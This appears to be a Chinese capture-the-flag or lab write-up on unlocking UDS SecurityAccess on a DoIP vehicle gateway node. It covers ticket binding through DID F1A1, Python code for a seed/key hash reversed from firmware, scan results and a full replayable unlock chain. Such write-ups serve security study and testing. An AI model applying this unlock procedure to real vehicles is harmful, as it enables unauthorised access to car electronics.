# 任务 04 WP：恢复 64 位 DoIP/UDS SecurityAccess（票据绑定 + 双 lane Seed/Key）

## 0. 一句话

`0x1220` 节点的 `0x27` 之所以恒回 `7F 27 7E`，不是"服务没实现"，而是**票据没有绑定**。
把任务 03 的**票据 ASCII 字符串原文**写进 DID `F1A1` → `6E F1A1`，就能拿 seed；
再用固件 `0x08000668` 的双 lane hash 算出 key → `27 02` → `67 02`，安全访问打开。

---

## 1. 目标拓扑：谁在应答

DoIP 车辆识别 + 路由激活：

```
TCP 10.226.193.2:13400
→ 0x0001 (vehicle identification)        ← 0x0004  VIN=CV622697F82A936A1, LA=0x1000, EID=060000001000
→ 0x0005 (routing activation, SA=0x0E00, type=0x00)  ← 0x0006  code=0x10  (成功)
```

**关键：UDS 必须发到功能地址 `0xE442`，才会被转发到真正的 UDS 节点 `0x1220`。**

| 目标地址 | 响应源 | 说明 |
|---|---|---|
| `0xE442` | **`0x1220`** | ✅ 唯一能到业务节点的路径 |
| `0x1000` | `0x1000` | 网关自身，只实现 `0x22` |
| `0x1220`（物理） | `0x1000` | 不路由，网关代答 `7F..31` |
| `0x07E0/0x07E8/0x07E1/0x07E9` | `0x1000` | 长超时 3 s 仍是代答，**没有转发到 CAN** |
| 其余 LA | `0x1000` | 代答 |

> **踩过的坑（判据污染）**：网关在节点慢响应时会**代答 `7F..31` 但把源地址写成 `0x1000`**。
> 用 `22F190` 扫 `0xE442` 时那一行会被记成 `src=0x1000`，单独复测真实源是 `0x1220`。
> **用 `10 03` 做探针不受影响**（节点立即回 `5003`），所以扫节点存在性要用 `10 03`。

---

## 2. 节点 `0x1220` 的能力画像

| 服务 | 结果 |
|---|---|
| `10 03` | `50 03` ✅（**唯一可用会话**；`10 01/02/04/05/40/60/61/7F/81` 全 `7F 10 12`） |
| `22 F1A3` | 未解锁 `7F 22 33`（DID 存在但受保护）；**解锁后 `62 F1A3 0000002daac9f4e3`** |
| `2E F1A1` | 未绑票 `7F 2E 35`；**送对票据 `6E F1A1`** |
| `27 01/02` | 未绑票 `7F 27 7E`；**绑票后正常走 seed/key** |
| `31 xx` | 未解锁 `7F 31 33`；解锁后 `7F 31 31`（安全门已过、**RID 不存在**） |
| 其余 SID | `7F xx 11` |

- **可读 DID**：全 65536 扫完（解锁态）只有 `F1A3`
- **可写 DID**：全 65536 扫完只有 `F1A1`
- **RID**：全 65536 扫完（关键段严格单发 + 中间段流水线对齐校验）**0 命中**

⇒ `0x1220` 是一个职责非常干净的服务节点：**票据槽（F1A1）+ freshness（F1A3）**。

---

## 3. 核心突破：票据必须送 ASCII

### 3.1 怎么发现 `F1A1` 是票据槽

`2E` 写 DID 时，**零长度数据会在 DID 查表之前就因长度错误被拒**，所以"全 DID + 零数据"扫描全 `31` 并不能说明 DID 不存在。改用**非空数据**重扫，才暴露出唯一一个异常：

```
2E <DID> + 4 字节数据，全 65536 个 DID
→ 只有一个 DID 返回非 31：
  DID = F1A1  →  7F 2E 35   (NRC 0x35 = invalidKey)
```

`0x35` 在 UDS 里是 **`0x27` sendKey 专用**的 NRC，`0x2E` 正常不会返回它——所以 `F1A1` 的写入实质是在做"值的校验"，即**票据绑定槽**。

### 3.2 关键格式：ASCII，不是二进制

| 送什么 | 结果 |
|---|---|
| 空数据 | `7F 2E 31`（长度错） |
| **解码后的 40 字节二进制** | `7F 2E 35` ❌ |
| tag(16) / nonce(16) / nonce+exp(24) | `7F 2E 35` ❌ |
| 票据 + 任意后缀（1 B / 2 B / 8 B） | `7F 2E 35` ❌ |
| 后缀 + 票据 | `7F 2E 35` ❌ |
| **票据 base64url 字符串原文（54 字符 ASCII）** | **`6E F1A1`** ✅ |

`F1A1` **只接受这一种值**——同一张票重写仍然 `6E F1A1`，其它任何值都 `35`。

```python
ticket = "9Uk3xp3BW6JP6dzEpEEAVgAAAABq998qRy54gjF-lG2PGBDTj-aZww"     # ASCII
link.diag(bytes.fromhex("2EF1A1") + ticket.encode("ascii"))
# -> 6ef1a1
```

---

## 4. 双 lane Seed/Key：`0x08000668`

### 4.1 固件里的原语（来自任务 02 的逆向）

调用约定：

| 寄存器 | 含义 |
|---|---|
| `r0` | 8 B lane-A seed |
| `r1` | 8 B lane-B seed |
| `r2` | 8 B 输出 key |
| C 常量 | `0x08002020` = `e224dd2bb23a15b8` |

```python
GOLD, M1, M2, K5 = 0x9E3779B9, 0x7FEB352D, 0x846CA68B, 0xA5A5A5A5
C_DEV = bytes.fromhex("e224dd2bb23a15b8")

def _lowbias32(x):
    x &= 0xFFFFFFFF
    x ^= x >> 16; x = (x * M1) & 0xFFFFFFFF
    x ^= x >> 15; x = (x * M2) & 0xFFFFFFFF
    x ^= x >> 16
    return x & 0xFFFFFFFF

def hash8(A, B, C=C_DEV):
    """双 lane（i=0,1），每 lane 一个 32-bit 分支 -> 输出 8 字节"""
    out = []
    for i in range(2):
        a = int.from_bytes(A[4*i:4*i+4], "little")
        b = int.from_bytes(B[4*i:4*i+4], "little")
        c = int.from_bytes(C[4*i:4*i+4], "little")
        x = _lowbias32(a ^ b ^ c ^ (((i+1) * GOLD) & 0xFFFFFFFF))
        out.append((x + ((i+1) * K5)) & 0xFFFFFFFF)
    return b"".join(v.to_bytes(4, "little") for v in out)
```

固件调用点自校验（`hash8(0,0,C_DEV)`）：

```
77be1f61090854c7      ← 与 Unicorn 逐指令执行结果逐字节一致 ✅
```

### 4.2 代数性质（能大幅压缩假设空间）

公式里 `A`、`B` 只以 `A_i ^ B_i` 出现，所以：

- `hash8(A,B,C) == hash8(B,A,C)` —— **谁叫 seed、谁叫密钥对输出无影响**
- `hash8(x,x,C) == hash8(0,0,C)` —— **self-mix 是退化映射**，整类可排除
- 有效映射必然是 `key = F(seed ⊕ K, C)`，`K` 是某个固定 8 B 上下文

### 4.3 实际的输入映射

```
seed        = 27 01 返回的 8 字节
secondInput = SHA256(VIN)[:8]        # CV622697F82A936A1 -> f33665e85d7dd347
C           = C_DEV = e224dd2bb23a15b8
key variant = raw（直接用 hash8 输出，不做额外变换）
```

---

## 5. 完整链路（实测可重放）

```
DoIP 0x0001                              -> VIN CV622697F82A936A1
DoIP 0x0005 (SA=0x0E00, type=0x00)       -> code 0x10
10 03            (TA=0xE442 -> 0x1220)   -> 50 03
2E F1A1 + <ASCII 票据>                    -> 6E F1A1      ← 票据绑定
27 01                                    -> 67 01 <8B seed>
key = hash8(seed, SHA256(VIN)[:8], C_DEV)
27 02 <key>                              -> 67 02         ← 解锁成功
22 F1A3                                  -> 62 F1A3 0000002daac9f4e3   ← 64 位 freshness
```

实测两组独立样本：

| seed | key | 结果 |
|---|---|---|
| `8130de48dd971973` | `e855304812b02b03` | `6702` ✅ |
| `052b91c02f2207c7` | `be22d234dd5374a7` | `6702` ✅ |

---

## 6. 三个必须知道的约束

1. **票据 TTL 精确 600 秒**，过期后 `2E F1A1` 同样回 `35`。每轮必须重新取票（重新下包 → 重新 mTLS → 重新 POST）。
2. **`27 01` 每次给新 seed**，必须用当次 seed 算 key；中间再发一次 `27 01` 会重置解锁状态。
3. **解锁态只在同一条 TCP 连接内有效**。解锁后要立刻用，不能先做别的请求再回来。

---

## 7. 为什么之前一直打不开（排查路线，值得留档）

| 尝试 | 结果 | 教训 |
|---|---|---|
| `27 <0x00-0xFF>` 全子功能 | 恒 `7E` | `7E` 是"子功能在当前会话不支持"，发生在**子功能派发之前**——当时误读成"缺票据" |
| `2E <全 DID>` + 零数据 | 恒 `31` | **零长度会先被判长度错**，掩盖了 `F1A1` |
| `2E <全 DID>` + 4 B 数据 | **只有 `F1A1` 回 `35`** | ✅ 这才是有效判据 |
| `31 01 <全 RID>` | 恒 `31`（解锁后） | `0x1220` 真的没有例程 |
| DoIP RA 11 字节载荷的票据 37 个 4 字节切片 | 全 `code 0x10`，无差异 | RA 的 OEM 字段不回显、不影响后续 |
| DoIP 全 payload type ~4400 个 | 只有 ident/RA/diag | DoIP 层没有旁路 |
| 用 `3E00` 扫全 65536 LA | 只有 `0x1000` 与 `0xE442→0x1220` | 后改用 `10 03` 复核，结论一致（网关对未知 TA 会代答，不会沉默） |
| 用票据的 `hash8` 各种组合去猜 `F1A1` 期望值 | 2197 组全 `35` | 方向错了——`F1A1` 要的是票据原文，不是派生值 |

**最终一击**：把票据当 **ASCII 字符串**写进 `F1A1`。

---

## 8. 交付物

| 路径 | 内容 |
|---|---|
| **`04_SOLVE/uds/solve_task04.py`** | **一条命令跑完全程**（自动下包→取票→解锁→探测） |
| `04_SOLVE/uds/u.py` | `fresh_ticket()` / `Link` / `unlock()` / `open_link()` 复用件 |
| `04_SOLVE/uds/doip.py` | DoIP/UDS 客户端 + NRC 解释表 |
| `04_SOLVE/uds/rid_*.py` | RID 扫描（严格单发 / 流水线 / 中间段） |
| `04_SOLVE/uds/did_2e_ticket.py` | 带真实数据的 `2E` 全 DID 扫描（就是它发现了 `F1A1`） |
| `03_EVIDENCE/cgw/` | 网关侧的 DoIP/UDS 原始 trace |

复现：

```bash
python 04_SOLVE/uds/solve_task04.py
```

```
[1] VIN = CV622697F82A936A1
[2] campaign=CAMP-243892C376D4CB2D5F826953  cred=5e7f07b4...
[3] ticket = NZNhWC_veEcnksyHhBdgMgAAAABq99Lll8jhUSTfmMFYyEJ0UDCHKg  (54 chars, TTL 600s)
[4] unlock chain:
  RA           -> 0e0010001000000000
  10 03        -> 5003
  2E F1A1+tick -> 6ef1a1
  27 01        -> 67018130de48dd971973
  seed=8130de48dd971973  key=e855304812b02b03
  27 02        -> 6702
[+] 解锁成功
```
